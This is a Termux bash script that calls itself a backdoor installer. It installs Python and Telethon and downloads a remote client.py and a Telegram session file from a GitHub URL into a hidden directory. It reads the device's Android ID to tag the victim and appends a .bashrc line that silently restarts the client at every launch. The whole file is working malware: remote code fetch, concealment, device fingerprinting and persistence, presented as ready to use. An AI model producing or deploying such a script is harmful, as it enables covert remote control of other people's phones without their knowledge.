#!/data/data/com.termux/files/usr/bin/bash
# Removed 'set -e' to prevent immediate exit on non-critical errors.
# Added error checking for critical steps.

# 1. Update and upgrade packages first
echo "[*] Updating package lists..."
pkg update -y || { echo "[-] Failed to update package lists. Check your network or Termux mirror."; exit 1; }

# 2. Install dependencies with non-interactive flags
echo "[*] Installing Python and dependencies..."
pkg install -y python python-pip || { echo "[-] Failed to install Python packages."; exit 1; }

# 3. Install telethon, with a fallback to install rust if compilation fails
echo "[*] Installing Telethon..."
if ! pip install --upgrade telethon; then
    echo "[!] Telethon installation failed. Attempting to install Rust and retry..."
    pkg install -y rust || { echo "[-] Failed to install Rust."; exit 1; }
    pip install --upgrade telethon || { echo "[-] Telethon installation failed after installing Rust."; exit 1; }
fi

# 4. Ensure the hidden directory exists before writing to it
REPO_URL="https://github.com/precise104/precise2/raw/main"
CLIENT_SCRIPT="client.py"
SESSION_FILE="client.session"
HIDDEN_DIR="$HOME/.config/.cache"
BASH_RC="$HOME/.bashrc"

mkdir -p "$HIDDEN_DIR" || { echo "[-] Failed to create hidden directory."; exit 1; }

# 5. Download files with error checking
echo "[*] Downloading client and session files..."
if ! curl -sL "$REPO_URL/$CLIENT_SCRIPT" -o "$HIDDEN_DIR/$CLIENT_SCRIPT"; then
    echo "[-] Failed to download client.py. Check the URL and your connection."; exit 1
fi
if ! curl -sL "$REPO_URL/$SESSION_FILE" -o "$HIDDEN_DIR/$SESSION_FILE"; then
    echo "[-] Failed to download session file. Check the URL and your connection."; exit 1
fi

# 6. Generate Device ID with a robust fallback
ID_FILE="$HIDDEN_DIR/device_id.txt"
if [ ! -f "$ID_FILE" ]; then
    AND_ID=$(/system/bin/settings get secure android_id 2>/dev/null)
    if [[ -z "$AND_ID" || "$AND_ID" == "null" || ${#AND_ID} -lt 4 ]]; then
        AND_ID=$(settings get secure android_id 2>/dev/null)
    fi
    if [[ -z "$AND_ID" || "$AND_ID" == "null" || ${#AND_ID} -lt 4 ]]; then
        AND_ID=$(head /dev/urandom | tr -dc a-z0-9 | head -c 4)
    fi
    DEV_ID="P-${AND_ID:0:4}"
    echo "$DEV_ID" > "$ID_FILE"
fi

chmod +x "$HIDDEN_DIR/$CLIENT_SCRIPT"

# 7. Add persistence line to .bashrc
PERSIST_LINE="pgrep -f \"python.*$CLIENT_SCRIPT\" > /dev/null || (python $HIDDEN_DIR/$CLIENT_SCRIPT >/dev/null 2>&1 &)"
if ! grep -qF "$PERSIST_LINE" "$BASH_RC"; then
    echo "$PERSIST_LINE" >> "$BASH_RC"
fi

echo "[+] Setup complete. Backdoor will start on next Termux launch."
